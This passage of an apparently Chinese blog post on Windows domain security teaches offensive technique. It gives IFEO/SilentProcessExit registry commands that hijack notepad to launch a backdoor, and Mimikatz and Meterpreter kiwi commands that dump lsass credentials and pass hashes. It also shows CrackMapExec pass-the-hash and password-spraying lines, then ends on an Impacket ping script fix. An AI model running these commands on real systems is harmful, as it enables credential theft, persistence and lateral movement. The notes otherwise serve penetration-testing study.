id="äº‹ä»¶è§¦å‘æ‰§è¡Œ"><a href="#äº‹ä»¶è§¦å‘æ‰§è¡Œ" class="headerlink" title="äº‹ä»¶è§¦å‘æ‰§è¡Œ"></a>äº‹ä»¶è§¦å‘æ‰§è¡Œ</h2><h3 id="ç²˜æ»é”®"><a href="#ç²˜æ»é”®" class="headerlink" title="ç²˜æ»é”®"></a>ç²˜æ»é”®</h3><h3 id="æ˜ åƒåŠ«æŒï¼ˆIFEO-æ³¨å…¥ï¼‰"><a href="#æ˜ åƒåŠ«æŒï¼ˆIFEO-æ³¨å…¥ï¼‰" class="headerlink" title="æ˜ åƒåŠ«æŒï¼ˆIFEO æ³¨å…¥ï¼‰"></a>æ˜ åƒåŠ«æŒï¼ˆIFEO æ³¨å…¥ï¼‰</h3><p>æ˜ åƒåŠ«æŒæ˜¯åˆ©ç”¨ Windows çš„ IFEOï¼ˆImage File Execution Optionsï¼‰åŠŸèƒ½æ¥å®ç°çš„ã€‚IFEO å®é™…ä¸Šæ˜¯ Windows çš„ä¸€é¡¹æ­£å¸¸åŠŸèƒ½ï¼Œä¸»è¦ç”¨äºè°ƒè¯•ç¨‹åºï¼Œå…¶åˆè¡·æ˜¯åœ¨ç¨‹åºå¯åŠ¨çš„æ—¶å€™å¼€å¯è°ƒè¯•å™¨æ¥è°ƒè¯•ç¨‹åºï¼Œè¿™æ ·ä¸€æ¥å¯ä»¥åœ¨è°ƒè¯•å™¨ä¸­è§‚å¯Ÿç¨‹åºåœ¨éš¾ä»¥é‡ç°çš„ç¯å¢ƒä¸­çš„è¡Œä¸ºã€‚</p><p>ç®€å•æ¥è¯´å°±æ˜¯ï¼Œé€šè¿‡ä¿®æ”¹ç¨‹åºæŒ‡å®šçš„æ³¨å†Œè¡¨å®ç°ç¨‹åºçš„åŠ«æŒï¼Œå½“è¿è¡Œç¨‹åºçš„æ—¶å€™å®é™…ä¸Šè¿è¡Œçš„æ˜¯æˆ‘ä»¬ç•™çš„åé—¨ç¨‹åºã€‚</p><p>ä¸€ä¸ªç¨‹åºå½“è¦è¿è¡Œçš„æ—¶å€™ï¼Œä¼šå»æ£€æŸ¥æ³¨å†Œè¡¨ï¼Œå¦‚æœæœ‰æŒ‡å®šçš„ç¨‹åºå¹¶ä¸”å¼€å¯äº† debuggerï¼Œé‚£ä¹ˆä¼šä¼˜å…ˆæ‰§è¡Œ debugger æŒ‡å®šçš„ç¨‹åºï¼Œè¿™æ ·å°±ä¼šé€ æˆæ˜ åƒåŠ«æŒã€‚</p><p>ä½¿ç”¨ powershell æŸ¥çœ‹ IFEO æ³¨å†Œè¡¨</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">get-acl</span> <span class="token operator">-</span>path <span class="token string">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¿®æ”¹æ³¨å†Œè¡¨ï¼ŒåŠ«æŒè®°äº‹æœ¬ä¸ºè®¡ç®—å™¨ï¼š</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">REG ADD <span class="token string">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"</span> <span class="token operator">/</span>v Debugger <span class="token operator">/</span>d <span class="token string">"c:\windows\system32\calc.exe"</span> <span class="token operator">/</span>reg:32REG DELETE <span class="token string">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"</span> <span class="token operator">/</span>v Debugger <span class="token operator">/</span>d <span class="token string">"c:\windows\system32\calc.exe"</span> <span class="token operator">/</span>reg:32<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>éšè—åŠ«æŒï¼šé…åˆ GlobalFlag æ¥å®ç°ï¼Œæ‰§è¡Œæ­£å¸¸å…³é—­åè§¦å‘ï¼Œä¹Ÿå°±æ˜¯è¯´å½“è®°äº‹æœ¬æ‰§è¡Œåï¼Œæœ¨é©¬æ˜¯ä¸ä¼šè¢«æ‰§è¡Œçš„ï¼ŒåŒæ—¶è®°äº‹æœ¬ä¾æ—§æ˜¯èƒ½å¤Ÿæ­£å¸¸è¿è¡Œçš„ï¼Œç›¸å½“äºæ— æ„Ÿæ“ä½œï¼Œä½†æ˜¯å½“å…³é—­è®°äº‹æœ¬çš„æ—¶å€™ï¼Œå°±ä¼šè‡ªåŠ¨è§¦å‘æ‰§è¡Œåé—¨æœ¨é©¬</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">reg add <span class="token string">"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"</span> <span class="token operator">/</span>v GlobalFlag <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 512reg add <span class="token string">"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe"</span> <span class="token operator">/</span>v ReportingMode <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 1reg add <span class="token string">"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe"</span> <span class="token operator">/</span>v MonitorProcess <span class="token operator">/</span>d <span class="token string">"C:\1\3000.exe"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="å±ä¿-amp-ç™»å½•"><a href="#å±ä¿-amp-ç™»å½•" class="headerlink" title="å±ä¿&amp;ç™»å½•"></a>å±ä¿&amp;ç™»å½•</h3><hr><h2 id="åŸŸåé—¨"><a href="#åŸŸåé—¨" class="headerlink" title="åŸŸåé—¨"></a>åŸŸåé—¨</h2><h3 id="SID-History"><a href="#SID-History" class="headerlink" title="SID History"></a>SID History</h3><p>SIDï¼ˆSecurity Identifiersï¼‰æ˜¯ Windows ç³»ç»Ÿä¸­çš„å®‰å…¨æ ‡è¯†ç¬¦ï¼Œæ˜¯ç”¨æˆ·ã€ç”¨æˆ·ç»„æˆ–å…¶ä»–å®‰å…¨ä¸»ä½“çš„å”¯ä¸€ã€ä¸å¯å˜æ ‡è¯†ç¬¦</p><p>å¦‚æœå°†å‰ä¸€ä¸ªè´¦æˆ·åˆ é™¤ï¼Œå†ç”¨ç›¸åŒçš„åå­—åˆ›å»ºå¦ä¸€ä¸ªè´¦æˆ·ï¼Œé‚£ä¹ˆæ–°è´¦æˆ·ä¸ä¼šå…·æœ‰å‰ä¸€ä¸ªè´¦æˆ·çš„ç‰¹æƒæˆ–è®¿é—®æƒé™ï¼Œè¿™æ˜¯å› ä¸ºä¸¤ä¸ªè´¦æˆ·çš„ SID ä¸åŒ</p><p>SID History æ˜¯ä¸€ä¸ªæ”¯æŒåŸŸè¿ç§»æ–¹æ¡ˆçš„å±æ€§ï¼Œä½¿å¾—ä¸€ä¸ªè´¦æˆ·çš„è®¿é—®æƒé™å¯ä»¥æœ‰æ•ˆåœ°å…‹éš†åˆ°å¦ä¸€ä¸ªè´¦æˆ·</p><hr><h2 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h2><hr><h1 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h1><h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><blockquote><p>Windows å¯†ç æå–å·¥å…·ï¼Œå¯æ”¶é›†å‡­è¯ä¿¡æ¯</p></blockquote><p>Windows ç³»ç»Ÿä¸­ç”¨æˆ·ç™»å½•åç³»ç»Ÿä¼šå°†èº«ä»½å‡­è¯å­˜å‚¨äº <code>lsass.exe</code> è¿›ç¨‹çš„å†…å­˜å½“ä¸­ï¼ŒMimikatz é€šè¿‡æ³¨å…¥ <code>lsass.exe</code> è¿›ç¨‹è¯»å–è¿›ç¨‹å†…å­˜ï¼Œå¯¹ lsass è¿›è¡Œé€†ç®—ï¼Œä»ä¸­è·å–å¯¹åº”çš„æ˜æ–‡å¯†ç ã€‚</p><blockquote><p>lsass æ˜¯å¾®è½¯ Windows ç³»ç»Ÿçš„å®‰å…¨æœºåˆ¶ï¼Œå®ƒä¸»è¦ç”¨äºæœ¬åœ°å®‰å…¨å’Œç™»é™†ç­–ç•¥ï¼Œé€šå¸¸æˆ‘ä»¬åœ¨<strong>ç™»é™†ç³»ç»Ÿæ—¶è¾“å…¥å¯†ç ä¹‹å</strong>ï¼Œå¯†ç ä¾¿ä¼šå‚¨å­˜åœ¨ lsass å†…å­˜ä¸­ï¼Œç»è¿‡å…¶ wdigest å’Œ tspkg ä¸¤ä¸ªæ¨¡å—è°ƒç”¨åï¼Œå¯¹å…¶ä½¿ç”¨å¯é€†çš„ç®—æ³•è¿›è¡ŒåŠ å¯†å¹¶å­˜å‚¨åœ¨å†…å­˜ä¹‹ä¸­ã€‚</p></blockquote><p>åœ¨å®‰è£…äº† KB 2871997 è¡¥ä¸æˆ–è€…ç³»ç»Ÿç‰ˆæœ¬å¤§äº windows server 2012 æ—¶ï¼Œé»˜è®¤åœ¨å†…å­˜ç¼“å­˜ä¸­ç¦æ­¢ä¿å­˜æ˜æ–‡å¯†ç ï¼Œä½†å¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨çš„æ–¹å¼æŠ“å–æ˜æ–‡ï¼Œcmd å‘½ä»¤ï¼ˆæ‰§è¡Œåé‡å¯æˆ–ç”¨æˆ·é‡æ–°ç™»å½•å°±å¯ä»¥æˆåŠŸæŠ“å–ï¼‰ï¼š</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Mimikatz çš„å¯åŠ¨éœ€è¦ Administrator&#x2F;SYSTEM æƒé™è¿è¡Œï¼Œé»˜è®¤æƒ…å†µä¸‹æ‹¥æœ‰ 32 ä½ä»¥åŠ 64 ä½ç‰ˆæœ¬</p><p>ä¿®æ”¹è¿è¡Œæƒé™ï¼š</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">privilege::debugprivilege:: <span class="token comment">#æŸ¥çœ‹ privilege çš„è¿è¡Œæ¨¡å—</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Sekurlsa-æ¨¡å—"><a href="#Sekurlsa-æ¨¡å—" class="headerlink" title="Sekurlsa æ¨¡å—"></a>Sekurlsa æ¨¡å—</h3><p>Sekurlsa æ¨¡å—èƒ½ä»<code>lsass.exe</code>è¿›ç¨‹ä¸­æå– passwordsã€keysã€pinã€tickets ç­‰ç”¨æˆ·å‡­æ®ä¿¡æ¯ï¼Œæ˜¯æœ€å¸¸ç”¨åˆ°æ¨¡å—ã€‚</p><p>è·å–æ˜æ–‡å¯†ç ï¼š</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/09/04/%E5%9F%9F%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/IMG-20250911103810594.png"></p><p>æŸ¥çœ‹ç”¨æˆ·å“ˆå¸Œ</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">lsadump::sam<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/09/04/%E5%9F%9F%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/IMG-20250911111901778.png"></p><p>æƒé™è¾ƒä½çš„è¯éœ€è¦æ‰§è¡Œ <code>process::runp</code> ä»¥ç³»ç»Ÿæƒé™è¿è¡Œ</p><p>è½¬å‚¨å¹¶å¯¼å‡º <code>lsass.exe</code> è¿›ç¨‹</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">sekurlsa::minidump lsass<span class="token punctuation">.</span>tmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é€šè¿‡å“ˆå¸Œä¼ é€’ pth è¿›è¡Œæ¨ªå‘ç§»åŠ¨</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">sekurlsa::pth <span class="token operator">/</span>user:admin <span class="token operator">/</span>domain:host1 <span class="token operator">/</span>ntlm:b2781ba85ac750ec286744b009599637sekurlsa::pth <span class="token operator">/</span>user:admin <span class="token operator">/</span>domain:host1 <span class="token operator">/</span>aes256:b2781ba85ac750ec286744b009599637<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="kiwi"><a href="#kiwi" class="headerlink" title="kiwi"></a>kiwi</h3><p>æ˜¯ msf ä¸‹çš„ä¸€ä¸ªæ¨¡å—</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> <span class="token builtin class-name">help</span> kiwi <span class="token comment">#æŸ¥çœ‹å¸®åŠ©</span>Kiwi Commands<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>Command                Description-------                -----------creds_all              <span class="token comment">#åˆ—ä¸¾æ‰€æœ‰å‡­æ®/æ‰€æœ‰çš„ç³»ç»Ÿå¯†ç </span>creds_kerberos         <span class="token comment">#åˆ—ä¸¾æ‰€æœ‰kerberoså‡­æ®</span>creds_msv              <span class="token comment">#åˆ—ä¸¾æ‰€æœ‰msvå‡­æ®</span>creds_ssp              <span class="token comment">#åˆ—ä¸¾æ‰€æœ‰sspå‡­æ®</span>creds_tspkg            <span class="token comment">#åˆ—ä¸¾æ‰€æœ‰tspkgå‡­æ®</span>creds_wdigest          <span class="token comment">#åˆ—ä¸¾æ‰€æœ‰wdigestå‡­æ®</span>dcsync                 <span class="token comment">#é€šè¿‡DCSyncæ£€ç´¢ç”¨æˆ·å¸æˆ·ä¿¡æ¯</span>dcsync_ntlm            <span class="token comment">#é€šè¿‡DCSyncæ£€ç´¢ç”¨æˆ·å¸æˆ·NTLMæ•£åˆ—ã€SIDå’ŒRID</span>golden_ticket_create   <span class="token comment">#åˆ›å»ºé»„é‡‘ç¥¨æ®</span>kerberos_ticket_list   <span class="token comment">#åˆ—ä¸¾kerberosç¥¨æ®</span>kerberos_ticket_purge  <span class="token comment">#æ¸…é™¤kerberosç¥¨æ®</span>kerberos_ticket_use    <span class="token comment">#ä½¿ç”¨kerberosç¥¨æ®</span>kiwi_cmd               <span class="token comment">#kiwi_cmd æ¨¡å—å¯ä»¥è®©æˆ‘ä»¬ä½¿ç”¨mimikatzçš„å…¨éƒ¨åŠŸèƒ½ï¼Œè¯¥å‘½ä»¤åé¢æ¥ mimikatz.exe çš„å‘½ä»¤</span>lsa_dump_sam           <span class="token comment">#dumpå‡ºlsaçš„SAM</span>lsa_dump_secrets       <span class="token comment">#dumpå‡ºlsaçš„å¯†æ–‡</span>password_change        <span class="token comment">#ä¿®æ”¹å¯†ç </span>wifi_list              <span class="token comment">#åˆ—å‡ºå½“å‰ç”¨æˆ·çš„wifié…ç½®æ–‡ä»¶</span>wifi_list_shared       <span class="token comment">#åˆ—å‡ºå…±äº«wifié…ç½®æ–‡ä»¶/ç¼–ç </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h2><p>å†…ç½‘åŸŸæ¸—é€ï¼Œæ”¯æŒ ftpï¼Œsmbï¼Œsshï¼Œwinrmï¼Œldapï¼Œrdpï¼Œmssql åè®®</p><h3 id="å“ˆå¸Œä¼ é€’å®ç°-smb-è¿æ¥"><a href="#å“ˆå¸Œä¼ é€’å®ç°-smb-è¿æ¥" class="headerlink" title="å“ˆå¸Œä¼ é€’å®ç° smb è¿æ¥"></a>å“ˆå¸Œä¼ é€’å®ç° smb è¿æ¥</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-x</span> é€šè¿‡cmd.exeæ‰§è¡Œå‘½ä»¤<span class="token parameter variable">-X</span> é€šè¿‡cmd.exeè°ƒç”¨æ‰§è¡Œpowershellå‘½ä»¤crackmapexec smb <span class="token number">192.168</span>.216.144 <span class="token parameter variable">-u</span> <span class="token string">'administrator'</span> <span class="token parameter variable">-p</span> <span class="token string">'pass1234!'</span> <span class="token parameter variable">-x</span> <span class="token string">'whoami'</span>æˆ–è€…ä½¿ç”¨ ntlm <span class="token builtin class-name">hash</span>crackmapexec smb <span class="token number">192.168</span>.216.144 <span class="token parameter variable">-u</span> <span class="token string">'administrator'</span> <span class="token parameter variable">-H</span> <span class="token string">'aad3b435b51404eeaad3b435b51404ee:ff1a0a31d936bc8bf8b1ffc5b244b356'</span> <span class="token parameter variable">-x</span> <span class="token string">'whoami'</span>é»˜è®¤æƒ…å†µä¸‹ä¼šè‡ªåŠ¨é€‰æ‹©ç™»å½•åŸŸï¼Œ-då¯ä»¥æŒ‡å®šåŸŸç™»å½•ï¼Œ-xè¦æ‰§è¡Œçš„å‘½ä»¤CMEå°†æŒ‰ä»¥ä¸‹é¡ºåºæ‰§è¡Œå‘½ä»¤<span class="token number">1</span>.wmiexecï¼šé€šè¿‡WMIæ‰§è¡Œå‘½ä»¤<span class="token number">2</span>.atexeï¼šé€šè¿‡Windowsä»»åŠ¡è°ƒåº¦ç¨‹åºè°ƒåº¦ä»»åŠ¡æ¥æ‰§è¡Œå‘½ä»¤<span class="token number">3</span>.smbexecï¼šé€šè¿‡åˆ›å»ºå’Œè¿è¡ŒæœåŠ¡æ¥æ‰§è¡Œå‘½ä»¤<span class="token parameter variable">-X</span> <span class="token string">'$PSVersionTable'</span> ä½¿ç”¨æŸ¥çœ‹powershellç‰ˆæœ¬ç¯å¢ƒå‘½ä»¤ ï¼Œ--amsi-bypass /path/payload æ‰§è¡Œpowershell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="smb-å¯†ç å–·æ´’"><a href="#smb-å¯†ç å–·æ´’" class="headerlink" title="smb å¯†ç å–·æ´’"></a>smb å¯†ç å–·æ´’</h3><blockquote><p>å¯†ç å–·æ´’æ”»å‡»å±äºä¸€ç§è‡ªåŠ¨åŒ–æ”»å‡»çš„æ–¹å¼ï¼Œä¸ºäº†é¿å…åªé’ˆå¯¹ä¸€ä¸ªç”¨æˆ·è¿›è¡Œå¯†ç çˆ†ç ´è€Œé€ æˆè´¦æˆ·é”å®šï¼Œå¯†ç å–·æ´’æ”»å‡»æ˜¯å¯¹æ‰€æœ‰ç”¨æˆ·è¿›è¡Œçˆ†ç ´ï¼Œæ—¢é¿å…äº†ç”¨æˆ·è¢«é”å®šï¼ŒåŒæ—¶ä¹Ÿæé«˜äº†ç”¨æˆ·ç ´è§£å¯†ç çš„æ•ˆç‡ã€‚åŒæ—¶ï¼Œä¸åŒäºå›ºå®šç”¨æˆ·åå¯¹å¯†ç è¿›è¡Œçˆ†ç ´ï¼Œå¯†ç å–·æ´’æ”»å‡»æ˜¯å›ºå®šå¯†ç å¯¹ç”¨æˆ·åè¿›è¡Œçˆ†ç ´ã€‚</p></blockquote><p>å·²æœ‰å¯†ç å­—å…¸çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥è¿›è¡Œ smb å¯†ç å–·æ´’çˆ†ç ´å‡ºå¯†ç å¯¹åº”çš„åŸŸå†…ç”¨æˆ·</p><p>å…ˆæ‹¿åˆ°åŸŸå†…å…¶ä¸­ä¸€å°æœºå™¨çš„ shell</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net user <span class="token operator">/</span>domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ•´ç†æˆå­—å…¸åä¾¿å¯ä»¥çˆ†ç ´</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crackmapexec smb <span class="token number">10.10</span>.10.12 <span class="token parameter variable">-u</span> users.txt <span class="token parameter variable">-p</span> <span class="token string">'admin!@#45'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h2><p><a href="https://www.freebuf.com/sectool/175208.html">https://www.freebuf.com/sectool/175208.html</a></p><blockquote><p>Impacket æ˜¯ä¸€ä¸ª Python ç±»åº“ï¼Œç”¨äºå¯¹ SMB1-3 æˆ– IPv4 &#x2F; IPv6 ä¸Šçš„ TCPã€UDPã€ICMPã€IGMPï¼ŒARPï¼ŒIPv4ï¼ŒIPv6ï¼ŒSMBï¼ŒMSRPCï¼ŒNTLMï¼ŒKerberosï¼ŒWMIï¼ŒLDAP ç­‰åè®®è¿›è¡Œä½çº§ç¼–ç¨‹è®¿é—®ã€‚ </p></blockquote><h3 id="MacOS-ä¸‹çš„é—®é¢˜"><a href="#MacOS-ä¸‹çš„é—®é¢˜" class="headerlink" title="MacOS ä¸‹çš„é—®é¢˜"></a>MacOS ä¸‹çš„é—®é¢˜</h3><p>mac ä¸‹çš„ç¯å¢ƒé—®é¢˜ï¼Œå‚è€ƒï¼š<a href="https://stackoverflow.com/questions/2438471/raw-socket-sendto-failure-in-os-x">https://stackoverflow.com/questions/2438471/raw-socket-sendto-failure-in-os-x</a></p><p>macos ä¸Š ICMP çš„ raw socket ä¸å…è®¸è‡ªå®šä¹‰ IP å¤´ï¼ˆå³ä¸èƒ½ç”¨Â IP_HDRINCLï¼‰ï¼Œåªèƒ½å‘é€ ICMP æ•°æ®éƒ¨åˆ†ï¼ŒIP å¤´ç”±ç³»ç»Ÿè‡ªåŠ¨å¡«å……ã€‚</p><p>ä½¿ç”¨ ping.py æ—¶ä¼šæŠ¥é”™ <code>OSError: [Errno 22] Invalid argument</code></p><p>ä¿®å¤æ–¹æ³•ï¼šåªå‘é€ ICMP åŒ…ï¼Œä¸å‘é€ IP åŒ…</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> select<span class="token keyword">import</span> socket<span class="token keyword">import</span> time<span class="token keyword">import</span> sys<span class="token keyword">from</span> impacket <span class="token keyword">import</span> ImpactDecoder<span class="token punctuation">,</span> ImpactPacket<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Use: %s &lt;src ip> &lt;dst ip>"</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>src <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>dst <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token comment"># Create a new IP packet and set its source and destination addresses.</span>ip <span class="token operator">=</span> ImpactPacket<span class="token punctuation">.</span>IP<span class="token punctuation">(</span><span class="token punctuation">)</span>ip<span class="token punctuation">.</span>set_ip_src<span class="token punctuation">(</span>src<span class="token punctuation">)</span>ip<span class="token punctuation">.</span>set_ip_dst<span class="token punctuation">(</span>dst<span class="token punctuation">)</span><span class="token comment"># Create a new ICMP packet of type ECHO.</span>icmp <span class="token operator">=</span> ImpactPacket<span class="token punctuation">.</span>ICMP<span class="token punctuation">(</span><span class="token punctuation">)</span>icmp<span class="token punctuation">.</span>set_icmp_type<span class="token punctuation">(</span>icmp<span class="token punctuation">.</span>ICMP_ECHO<span class="token punctuation">)</span><span class="token comment"># Include a 156-character long payload inside the ICMP packet.</span>icmp<span class="token punctuation">.</span>contains<span class="token punctuation">(</span>ImpactPacket<span class="token punctuation">.</span>Data<span class="token punctuation">(</span><span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">156</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Have the IP packet contain the ICMP packet (along with its payload).</span>ip<span class="token punctuation">.</span>contains<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span><span class="token comment"># Open a raw socket. Special permissions are usually required.</span>s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_RAW<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>IPPROTO_ICMP<span class="token punctuation">)</span><span class="token comment"># s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)</span>seq_id <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token comment"># Give the ICMP packet the next ID in the sequence.</span>    seq_id <span class="token operator">+=</span> <span class="token number">1</span>    icmp<span class="token punctuation">.</span>set_icmp_id<span class="token punctuation">(</span>seq_id<span class="token punctuation">)</span>    <span class="token comment"># Calculate its checksum.</span>    icmp<span class="token punctuation">.</span>set_icmp_cksum<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    icmp<span class="token punctuation">.</span>auto_checksum <span class="token operator">=</span> <span class="token number">1</span>    <span class="token comment"># Send it to the target host.</span>    <span class="token comment"># s.sendto(ip.get_packet(), (dst, 0))</span>    <span class="token comment"># åªå‘é€ICMPåŒ…ï¼Œä¸å‘é€IPåŒ…</span>    s<span class="token punctuation">.</span>sendto<span class="token punctuation">(</span>icmp<span class="token punctuation">.</span>get_packet<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># Wait for incoming replies.</span>    <span class="token keyword">if</span> s <span class="token keyword">in</span> select<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token punctuation">[</span>s<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        reply <span class="token operator">=</span> s<span class="token punctuation">.</span>recvfrom<span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token comment"># Use ImpactDecoder to reconstruct the packet hierarchy.</span>        rip <span class="token operator">=</span> ImpactDecoder<span class="token punctuation">.</span>IPDecoder<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span>reply<span class="token punctuation">)</span>        <span class="token comment"># Extract the ICMP packet from its container (the IP packet).</span>        ricmp <span class="token operator">=</span> rip<span class="token punctuation">.</span>child<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># If the packet matches, report it to the user.</span>        <span class="token keyword">if</span> rip<span class="token punctuation">.</span>get_ip_dst<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> src <span class="token keyword">and</span> rip<span class="token punctuation">.</span>get_ip_src<span class="token punctuation">(</span>        <span class="token punctuation">)</span> <span class="token operator">==</span> dst <span class="token keyword">and</span> icmp<span class="token punctuation">.</span>ICMP_ECHOREPLY <span class="token operator">==</span> ricmp<span class="token punctuation">.</span>get_icmp_type<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Ping reply for sequence #%d"</span> <span class="token operator">%</span> ricmp<span class="token punctuation">.</span>get_icmp_id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/09/04/%E5%9F%9F%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/IMG-20251009012800690.png"></p><h3 id="åŠŸèƒ½"><a href="#åŠŸèƒ½" class="headerlink" title="åŠŸèƒ½"></a>åŠŸèƒ½</h3><p>å¦‚æœæœ‰ä¸‹è½½æºç çš„è¯ï¼Œè„šæœ¬éƒ½åœ¨ examples ç›®å½•ä¸‹</p><ul><li>ping.pyï¼šICMP Pingï¼Œä½¿ç”¨ ICMP echo å’Œ echo-reply 